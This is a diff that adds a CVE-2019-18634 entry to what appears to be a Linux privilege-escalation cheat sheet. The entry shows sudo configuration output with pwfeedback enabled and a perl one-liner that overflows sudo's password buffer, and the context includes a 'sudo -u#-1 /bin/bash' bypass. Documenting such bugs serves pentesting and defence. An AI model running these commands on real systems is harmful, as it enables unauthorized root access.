@@ -201,6 +201,24 @@ With ALL specified, user can run the binary `/bin/bash` as any user \(not only r
 sudo -u#-1 /bin/bash
 ```
 
+### CVE-2019-18634
+
+When `pwfeedback` is set in a specific versions of sudo \(&lt;1.8.25p\), we can trigger stack-based buffer overflow. Exploiting the bug does not require sudo permissions, merely that `pwfeedback` be enabled.
+
+```text
+Matching Defaults entries for user on linux-build:
+insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail
+
+User user may run the following commands on linux-build:
+(ALL : ALL) ALL
+```
+
+The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.
+
+```text
+perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+```
+
 ## Cron jobs
 
 Crons are located in:
